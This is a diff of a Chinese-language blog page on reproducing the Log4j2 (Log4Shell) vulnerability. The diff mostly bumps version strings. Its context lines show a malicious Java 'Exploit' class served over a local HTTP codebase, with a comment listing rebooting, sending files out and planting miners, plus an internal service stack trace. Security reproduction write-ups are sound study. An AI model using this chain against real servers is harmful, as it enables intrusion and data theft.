@@ -3,7 +3,7 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>安全｜Log4j2 复现与原理 | Yao177&#39;s Blog</title>
-<link rel="shortcut icon" href="https://yao177.github.io/favicon.ico?v=1646363535609">
+<link rel="shortcut icon" href="https://yao177.github.io/favicon.ico?v=1646364026883">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://yao177.github.io/styles/main.css">
 <link rel="alternate" type="application/atom+xml" title="安全｜Log4j2 复现与原理 | Yao177&#39;s Blog - Atom Feed" href="https://yao177.github.io/atom.xml">
@@ -36,7 +36,7 @@ CodeBase服务器
       <div class="main-content">
         <div class="site-header">
   <a href="https://yao177.github.io">
-  <img class="avatar" src="https://yao177.github.io/images/avatar.png?v=1646363535609" alt="">
+  <img class="avatar" src="https://yao177.github.io/images/avatar.png?v=1646364026883" alt="">
   </a>
   <h1 class="site-title">
     Yao177&#39;s Blog
@@ -134,7 +134,7 @@ CodeBase服务器
 <p>任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。</p>
 <h2 id="codebase服务器">CodeBase服务器</h2>
 <p>直接用 python 自带的 SimpleHttpServer 即可。将恶意 class 放入目录下。</p>
-<pre><code class="language-Java">public class Exploit {
+<pre><code class="language-java">public class Exploit {
     static {
 //        try {
 //            Runtime.getRuntime().exec(&quot;reboot&quot;); 可以是任意代码，例如关机指令、进程关闭、将服务器文件外传、将内网拓扑结构外传、嵌入挖矿软件，any
@@ -180,7 +180,7 @@ CodeBase服务器
 <p>这个ref便是我们的HTTP服务器：http://127.0.0.1:1234/，至此完成攻击。</p>
 <h1 id="example">Example</h1>
 <p>*ppo login、5*8 online</p>
-<pre><code class="language-Java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
+<pre><code class="language-java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
  com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
 (['Sat Dec 11 21:06:39 2021'], ':', 'ender.append(AbstractOutputStreamAppender.java:108), org.apache.logging.log4j.core.appender.RollingFileAppender.append(RollingFileAppender.java:88), org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99), org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367), org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112), org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:738), org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:708), org.apache.logging.slf4j.Log4jLogger.info(Log4jLogger.java:193), com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
 ('receive from 2:', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
